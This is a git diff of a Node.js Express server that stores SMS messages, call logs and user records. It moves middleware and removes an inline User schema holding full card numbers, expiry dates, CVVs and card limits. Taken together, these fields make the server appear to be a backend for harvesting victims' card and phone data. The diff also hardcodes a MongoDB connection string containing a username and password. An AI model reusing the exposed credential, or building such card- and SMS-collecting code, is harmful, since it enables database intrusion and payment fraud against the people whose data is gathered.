@@ -8,6 +8,8 @@ const { Server } = require("socket.io");
 const app = express();
 const PORT = 3000;
 
+const User = require("./models/User"); // ✅ IMPORTANT
+
 /* =======================
    HTTP SERVER & SOCKET.IO
 ======================= */
@@ -25,6 +27,15 @@ app.use(express.json());
 mongoose.connect("mongodb+srv://oosrp9132_db_user:BnixQ3Qdq7kPXBcG@cluster0.vez1b2n.mongodb.net/")
   .then(() => console.log("✅ MongoDB connected"))
   .catch(err => console.error("❌ MongoDB error:", err));
+
+
+/* =======================
+   MIDDLEWARE
+======================= */
+app.use(cors());
+app.use(express.static("public"));
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
 
 /* =======================
    SMS SCHEMA
@@ -58,68 +69,7 @@ const CallLogSchema = new mongoose.Schema({
 
 const CallLog = mongoose.model("CallLog", CallLogSchema);
 
-const UserSchema = new mongoose.Schema({
 
-    // ✅ App user info
-    userId: { type: String, required: true }, // NEW: link to user
-    name: {
-        type: String,
-        required: true,
-        trim: true
-    },
-
-    phone: {
-        type: String,
-        required: true,
-        index: true
-    },
-
-    dob: {
-        type: String
-    },
-
-    email: {
-        type: String,
-        lowercase: true,
-        trim: true
-    },
-
-    city: {
-        type: String
-    },
-
-    // ✅ Card info (⚠️ NOT RECOMMENDED for production)
-    cardHolderName: {
-        type: String
-    },
-
-    cardTotalLimit: {
-        type: Number
-    },
-
-    cardAvailableLimit: {
-        type: Number
-    },
-
-    cardNumber: {
-        type: String, // ⚠️ Sensitive
-        select: false // ✅ won't auto-return in queries
-    },
-
-    expiryDate: {
-        type: String
-    },
-
-    cvv: {
-        type: String,
-        select: false // ✅ extra safety
-    }
-
-}, {
-    timestamps: true
-});
-
-module.exports = mongoose.model("User", UserSchema);
 
 
 
@@ -168,17 +118,6 @@ app.post("/submit-form", async (req, res) => {
     }
 });
 
-/* =======================
-   MIDDLEWARE
-======================= */
-app.use(cors());
-app.use(express.static("public"));
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
-
-/* =======================
-   ROUTES
-======================= */
 // Test API
 app.get("/", (req, res) => {
   res.send("✅ SMS API with MongoDB is running");
